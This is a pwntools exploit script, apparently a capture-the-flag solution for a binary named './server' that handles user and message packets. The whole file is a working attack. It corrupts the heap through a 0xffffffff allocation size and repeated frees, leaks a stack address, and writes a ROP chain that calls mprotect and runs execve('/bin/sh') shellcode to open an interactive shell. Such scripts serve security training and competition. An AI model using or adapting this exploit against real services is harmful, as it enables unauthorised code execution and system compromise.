#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal

salt = os.getenv('GDB_SALT') if (os.getenv('GDB_SALT')) else ''

def clear(signum=None, stack=None):
    print('Strip  all debugging information')
    os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
    exit(0)

for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
    signal.signal(sig, clear)

# # Create a symbol file for GDB debugging
# try:
#     gdb_symbols = '''

#     '''

#     f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
#     f.write(gdb_symbols)
#     f.close()
#     os.system('gcc -g -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
#     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
# except Exception as e:
#     print(e)

context.arch = 'amd64'
# context.arch = 'i386'
context.log_level = 'debug'
execve_file = './server'
# sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
sh = process(execve_file)
# sh = remote('', 0)
elf = ELF(execve_file)
# libc = ELF('./libc-2.27.so')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    def pr
        x/12gx 0x6BF500
        end
    
    b *0x401164
    '''

    f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    print(e)

def p32e(value): return p32(value, endian='big')

def create_user(username, host_ip):
    packet = ''
    packet += p32e(1)
    packet += p32e(1)
    packet += p32e(len(username)) + username + '\0' * (4 - (len(username) % 4))
    packet += p32e(len(host_ip)) + host_ip + '\0' * (4 - (len(host_ip) % 4))
    sh.send(packet)
    return sh.recvn(0x1000)

def show_user():
    packet = ''
    packet += p32e(2)
    sh.send(packet)
    return sh.recvn(0x1000) 

def delete_user(index):
    packet = ''
    packet += p32e(3)
    packet += p32e(index)
    sh.send(packet)
    return sh.recvn(0x1000)

def add_message(user_index, size, content):
    packet = ''
    packet += p32e(4)
    packet += p32e(user_index)
    packet += p32e(size) + content + '\0' * (4 - (size % 4))
    sh.send(packet)
    return sh.recvn(0x1000)

def show_message():
    packet = ''
    packet += p32e(5)
    sh.send(packet)
    return sh.recvn(0x1000) 

def delete_message(index):
    packet = ''
    packet += p32e(6)
    packet += p32e(index)
    sh.send(packet)
    return sh.recvn(0x1000)

message_list = 0x6BF500
leak_stack_addr = 0x6beee8

create_user('aa', 'bb')
add_message(0, 0x17, 'c' * 0x17)
delete_message(0)
add_message(0, 0xffffffff, '')
delete_message(0)

add_message(0, 0x17, p64(message_list).ljust(0x17, '\0'))
add_message(0, 0x17, 'd' * 0x17)
add_message(0, 0x17, p64(0) + p64(leak_stack_addr) + p64(8))

result = show_message()
head = result.rfind(' ') + 1
stack_addr = u64(result[head: head + 8]) - 0x11a0
log.success('stack_addr: ' + hex(stack_addr))

sh.recvn(0x1000)
sh.recvn(0x1000)

add_message(0, 0xf7, 'c' * 0xf7)
delete_message(3)
add_message(0, 0xffffffff, '')
delete_message(3)


add_message(0, 0xf7, p64(stack_addr).ljust(0xf7, '\0'))
add_message(0, 0xf7, 'g' * 0xf7)

layout = [
    0x0000000000400686, # : pop rdi ; ret
    (stack_addr & 0xfffffffffffff000),

    0x000000000040321e, # : pop r12 ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
    0,                  # xdr->x_op
    0x6B9140,           # xdr->x_ops, if we don't set the value, it will directly crash.
    elf.bss(),          # xdr->x_public
    elf.bss(),          # xdr->x_private
    elf.bss(),          # xdr->x_base

    0x0000000000410df3, # : pop rsi ; ret
    0x2000,
    0x000000000044a175, # : pop rdx ; ret
    7,
    0x000000000044a11c, # : pop rax ; ret
    10,                 # sys_mprotect
    0x00000000004773c5, # : syscall ; ret

    0x0000000000496d53, # : jmp rsp
]

shellcode = asm('''
mov rax, 0x0068732f6e69622f
push rax

mov rdi, rsp
xor rsi, rsi
mul rsi
mov al, 59
syscall
''')

add_message(0, 0xf7, flat(layout) + shellcode)

sh.interactive()
clear()